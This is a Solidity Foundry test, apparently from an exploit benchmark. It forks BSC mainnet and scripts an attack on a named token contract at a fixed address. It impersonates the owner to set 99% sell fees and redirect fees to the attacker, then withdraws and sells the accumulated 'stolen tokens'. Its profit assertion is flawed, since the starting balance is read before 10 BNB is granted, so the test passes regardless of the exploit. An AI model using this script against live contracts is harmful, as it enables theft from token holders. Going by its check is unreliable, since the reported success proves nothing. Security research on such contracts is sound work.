pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal interface for xenoX token
interface xenoX {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function setSellLiquidityFeePercent(uint256 liquidityFee) external;
    function setSelldevFeePercent(uint256 devFee) external;
    function setdevAddress(address payable devAddress) external;
    function transferTokens(address recepient, uint256 amount) external;
    function pancakePair() external view returns (address);
}

// PancakeRouter interface (simplified)
interface IPancakeRouter02 {
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xcb9fD3784e9F369C4AD3BD4CB0d3a21aCbF23a51;
    address attacker = address(this);
    address WETH;
    IPancakeRouter02 router;
    xenoX tokenContract;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: We need to fork mainnet to interact with PancakeSwap
        vm.createSelectFork(vm.rpcUrl("bsc"));

        // Label addresses for debugging
        vm.label(TARGET, "xenoX Token");
        vm.label(0x10ED43C718714eb63d5aA57B78B54704E256024E, "PancakeRouter");

        // Initialize contract instances
        tokenContract = xenoX(TARGET);
        router = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);

        // Get the current owner of the contract
        owner = tokenContract.owner();

        // Get WETH address from PancakeRouter
        WETH = router.WETH();

        // Impersonate the owner for the entire test
        vm.startPrank(owner);

        // Set dev address to attacker for fee collection (optional)
        tokenContract.setdevAddress(payable(attacker));

        // Set extremely high sell fees
        tokenContract.setSellLiquidityFeePercent(99);
        tokenContract.setSelldevFeePercent(99);

        // Stop impersonating owner for now
        vm.stopPrank();

        // Get the PancakePair address
        address pair = tokenContract.pancakePair();
        vm.label(pair, "xenoX-WBNB Pair");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial BNB balance
        uint256 initialBalance = address(attacker).balance;

        // Step 1: Get some xenoX tokens to sell
        // We need to buy some tokens first. Let's swap some BNB for xenoX
        vm.deal(attacker, 10 ether); // Give attacker BNB to buy tokens

        // Buy some xenoX tokens
        address[] memory buyPath = new address[](2);
        buyPath[0] = WETH;
        buyPath[1] = TARGET;

        vm.prank(attacker);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 1 ether}(
            0,
            buyPath,
            attacker,
            block.timestamp
        );

        // Check our token balance
        uint256 tokenBalance = tokenContract.balanceOf(attacker);
        require(tokenBalance > 0, "Failed to buy tokens");

        // Step 2: Approve router to spend our tokens
        vm.prank(attacker);
        tokenContract.approve(address(router), type(uint256).max);

        // Step 3: Sell tokens - this will trigger the high fees
        address[] memory sellPath = new address[](2);
        sellPath[0] = TARGET;
        sellPath[1] = WETH;

        uint256 balanceBeforeSell = address(attacker).balance;

        vm.prank(attacker);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBalance / 2, // Sell half of our tokens
            0,
            sellPath,
            attacker,
            block.timestamp
        );

        // Step 4: Check that fees accumulated in the contract
        uint256 contractTokenBalance = tokenContract.balanceOf(TARGET);
        require(contractTokenBalance > 0, "No fees accumulated in contract");

        // Step 5: As owner, withdraw accumulated tokens
        vm.startPrank(owner);

        // Withdraw all accumulated tokens to attacker
        tokenContract.transferTokens(attacker, contractTokenBalance);

        vm.stopPrank();

        // Step 6: Sell the withdrawn tokens for profit
        uint256 stolenTokens = tokenContract.balanceOf(attacker);
        require(stolenTokens > 0, "No tokens stolen");

        // Approve router again for the stolen tokens
        vm.prank(attacker);
        tokenContract.approve(address(router), type(uint256).max);

        // Sell the stolen tokens
        vm.prank(attacker);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            stolenTokens,
            0,
            sellPath,
            attacker,
            block.timestamp
        );

        // Final check: attacker's BNB balance should have increased
        uint256 finalBalance = address(attacker).balance;
        require(finalBalance > initialBalance, "Attack failed - no profit");

        // The oracle will check assertGt(finalBalance, initialBalance)
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

